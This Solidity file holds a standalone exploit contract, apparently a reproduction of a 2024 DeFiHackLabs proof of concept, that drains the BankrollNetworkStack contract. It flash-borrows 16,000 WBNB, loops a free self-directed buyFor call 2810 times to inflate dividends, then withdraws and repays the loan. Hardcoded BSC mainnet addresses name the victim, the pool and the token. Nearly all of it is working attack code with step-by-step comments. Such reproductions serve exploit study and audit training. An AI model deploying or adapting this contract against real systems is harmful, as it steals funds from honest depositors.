// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2024-09-Bankroll).
//
// The DeFiHackLabs PoC runs the attack INLINE in the Foundry test contract
// `ContractTest` (attacker == address(this); the PancakeSwap V3 flash-loan
// callback `pancakeV3FlashCallback` lives on the test itself, no standalone
// exploit contract):
//
//   pool.flash(address(this), 0, 16_000 ether, "0x01");
//   // in the callback:
//   WBNB.approve(address(bankRoll), type(uint256).max);
//   bankRoll.buyFor(address(this), WBNB.balanceOf(address(this)));   // real buy, dominant shares
//   for (uint256 i = 0; i < 2810; i++) {
//       bankRoll.buyFor(address(bankRoll), bal_bank_roll);           // free self-buy, pumps profitPerShare_
//   }
//   bankRoll.sell(bankRoll.myTokens());
//   bankRoll.withdraw();
//   WBNB.transfer(address(pool), borrow_amount + fee0 + fee1);       // repay flash loan
//
// Root cause: BankrollNetworkStack.buyFor(address _customerAddress, uint buy_amount)
// is permissionless and lets the caller direct a purchase to ANY address while
// funding it via transferFrom(_customerAddress, ...). Calling
// buyFor(address(bankRoll), X) makes the contract "buy from itself" —
// transferFrom(bankRoll, bankRoll, X) leaves its WBNB balance unchanged, but
// purchaseTokens()/allocateFees() still unconditionally bumps the global
// profitPerShare_ accumulator by a fifth of the (unpaid) 10% fee. Looping this
// free self-buy inflates the attacker's dividends far beyond what the
// contract's real WBNB balance ever received, and withdraw() pays the
// manufactured dividends out in real WBNB drained from honest depositors.
//
// This contract deploys as the attacker (single entrypoint `attack()`, no
// constructor args), replicating the test's `address(this)` role, including
// acting as its own PancakeSwap V3 flash-loan callback receiver.

interface IWBNB {
    function approve(address guy, uint256 wad) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
}

interface IERC20Min {
    function balanceOf(address account) external view returns (uint256);
}

interface IUniPairV3 {
    function flash(address recipient, uint256 amount0, uint256 amount1, bytes calldata data) external;
}

interface IBankrollNetworkStack {
    function buyFor(address _customerAddress, uint256 buy_amount) external returns (uint256);
    function myTokens() external view returns (uint256);
    function sell(uint256 _amountOfTokens) external;
    function dividendsOf(address _customerAddress) external view returns (uint256);
    function withdraw() external;
}

contract BankrollDrain {
    IWBNB internal constant WBNB = IWBNB(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));
    IUniPairV3 internal constant POOL = IUniPairV3(0x36696169C63e42cd08ce11f5deeBbCeBae652050);
    IBankrollNetworkStack internal constant BANKROLL =
        IBankrollNetworkStack(0x564D4126AF2B195fFAa7fB470ED658b1D9D07A54);

    uint256 internal borrowAmount;

    /// @notice Recorded attack entrypoint: flash-borrow WBNB and let the
    ///         PancakeSwap V3 pool's callback drive the whole exploit.
    function attack() external {
        borrowAmount = 16_000 ether;
        POOL.flash(address(this), 0, borrowAmount, "0x01");
    }

    /// @notice PancakeSwap V3 flash-loan callback — this is where the actual
    ///         self-buy pump-and-drain happens, mirroring the test's inline
    ///         `pancakeV3FlashCallback`.
    function pancakeV3FlashCallback(uint256 fee0, uint256 fee1, bytes memory) public {
        WBNB.approve(address(BANKROLL), type(uint256).max);

        // Step 1: one real buy — funded by the flash-borrowed WBNB — gives
        // this contract dominant share weight and an immediate dividend credit.
        BANKROLL.buyFor(address(this), WBNB.balanceOf(address(this)));

        uint256 balBankRoll = WBNB.balanceOf(address(BANKROLL));

        // Step 2: loop the free self-buy. Each call is
        // transferFrom(bankRoll -> bankRoll, balBankRoll) — balance-neutral —
        // yet purchaseTokens()/allocateFees() still bumps profitPerShare_ by
        // a fifth of the (never-paid) 10% fee, credited pro-rata to every
        // holder including this contract.
        for (uint256 i = 0; i < 2810; i++) {
            BANKROLL.buyFor(address(BANKROLL), balBankRoll);
        }

        // Step 3: cash out the inflated dividends in real WBNB.
        BANKROLL.sell(BANKROLL.myTokens());
        BANKROLL.withdraw();

        // Step 4: repay the flash loan; whatever WBNB remains is profit.
        WBNB.transfer(address(POOL), borrowAmount + fee0 + fee1);
    }

    receive() external payable {}
}
